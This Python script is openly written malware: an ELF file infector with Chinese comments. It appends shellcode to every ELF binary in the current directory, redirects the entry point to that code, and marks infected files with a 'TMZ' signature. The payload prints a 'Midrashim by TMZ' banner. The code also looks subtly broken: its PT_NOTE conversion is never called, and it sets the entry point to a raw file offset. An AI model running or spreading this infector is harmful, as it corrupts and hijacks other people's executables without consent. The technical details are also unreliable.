import struct
import os

# 修改 PT_NOTE 段为 PT_LOAD 段
def modify_ptnote_to_ptload(fd, note_offset):
    fd.seek(note_offset)
    fd.write(struct.pack('<I', 1))  # 将 NOTE 段类型修改为 LOAD

# 注入 shellcode 到指定位置
def inject_shellcode(fd, injection_offset, shellcode):
    fd.seek(injection_offset)
    fd.write(shellcode)

# 检查文件是否为 ELF 并且未被感染
def is_elf_and_not_infected(fd):
    fd.seek(0)
    magic = fd.read(4)
    if magic != b'\x7fELF':
        return False

    # 检查是否已经被感染
    fd.seek(0x152)  # 检查 ELF 头中的填充字段
    signature = fd.read(4)
    if signature == b'TMZ\x00':  # 假设 'TMZ' 是感染标志
        return False

    return True

# 修改 ELF 文件的入口点
def modify_entry_point(fd, new_entry_point):
    fd.seek(0x18)  # ELF header 中 e_entry 字段的偏移位置
    fd.write(struct.pack('<Q', new_entry_point))

def infect_elf(file_path):
    try:
        with open(file_path, 'rb+') as fd:
            print(f"Attempting to infect: {file_path}")

            # 检查文件是否为 ELF 且未被感染
            if not is_elf_and_not_infected(fd):
                print(f"Skipping: {file_path}")
                return

            # 获取原始入口点
            fd.seek(0x18)  # ELF header 中 e_entry 字段的偏移
            original_entry_point = struct.unpack('<Q', fd.read(8))[0]

            # 构造 shellcode
            # 该 shellcode 负责显示一段信息并跳转回原始程序入口点
            shellcode = (
                b"\x50\x51\x52\x53\x54\x55\x56\x57"                # 保存寄存器 (push rax, rcx, rdx, rbx, rsp, rbp, rsi, rdi)
                b"\x48\xc7\xc0\x01\x00\x00\x00"                    # mov rax, 1 (系统调用号 1 表示 write)
                b"\x48\xc7\xc7\x01\x00\x00\x00"                    # mov rdi, 1 (文件描述符 1 表示标准输出)
                b"\x48\x8d\x35\x10\x00\x00\x00"                    # lea rsi, [rip+0x10] (消息地址)
                b"\x48\xc7\xc2\x16\x00\x00\x00"                    # mov rdx, 22 (消息长度)
                b"\x0f\x05"                                        # syscall (触发系统调用)
                b"\x5f\x5e\x5d\x5c\x5b\x5a\x59\x58"                # 恢复寄存器 (pop rdi, rsi, rbp, rsp, rbx, rdx, rcx, rax)
                b"\x48\xb8" + struct.pack('<Q', original_entry_point) + b"\xff\xe0"  # 跳转到原始入口点
                b"Midrashim by TMZ (c) 2020\n"                     # 要输出的消息
            )

            # 注入 shellcode 到文件末尾
            fd.seek(0, os.SEEK_END)  # 确定文件末尾
            end_of_file = fd.tell()

            # 确保注入的位置足够
            injection_offset = end_of_file
            inject_shellcode(fd, injection_offset, shellcode)

            # 修改入口点为注入代码的位置
            modify_entry_point(fd, injection_offset)

            # 标记文件为已感染
            fd.seek(0x152)
            fd.write(b'TMZ\x00')

            print(f"Infected: {file_path}")
    except Exception as e:
        print(f"Failed to infect {file_path}: {e}")

# 遍历当前目录并感染所有符合条件的 ELF 文件
def main():
    current_dir = os.getcwd()
    for file_name in os.listdir(current_dir):
        file_path = os.path.join(current_dir, file_name)
        if os.path.isfile(file_path):
            infect_elf(file_path)

if __name__ == "__main__":
    main()

